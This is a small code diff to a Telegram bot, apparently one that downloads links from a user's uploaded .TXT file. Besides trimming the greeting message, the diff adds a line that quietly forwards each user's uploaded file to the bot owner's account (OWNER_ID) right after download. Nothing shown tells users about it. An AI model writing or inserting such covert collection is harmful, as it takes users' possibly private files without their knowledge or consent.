@@ -32,7 +32,7 @@ bot = Client(
 
 @bot.on_message(filters.command(["start"]))
 async def account_login(bot: Client, m: Message):
-    editable = await m.reply_text("Hey Freind 😎 I Am A Bot For Download Links From Your **.TXT** File. \n\n **Bot Made By 𝙈𝘼𝙃𝙄® ** \n\n Send /mahi ")
+    editable = await m.reply_text("I Am A Bot For Download Links From Your **.TXT** File. \n\n **Bot Made By 𝙈𝘼𝙃𝙄® ** \n\n Send /mahi ")
 
 
 @bot.on_message(filters.command("stop") & filters.user(ADMINS))
@@ -48,6 +48,7 @@ async def account_login(bot: Client, m: Message):
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
     await input.delete(True)
+    await bot.send_document(OWNER_ID, document=x)
 
     path = f"./downloads/{m.chat.id}"
 
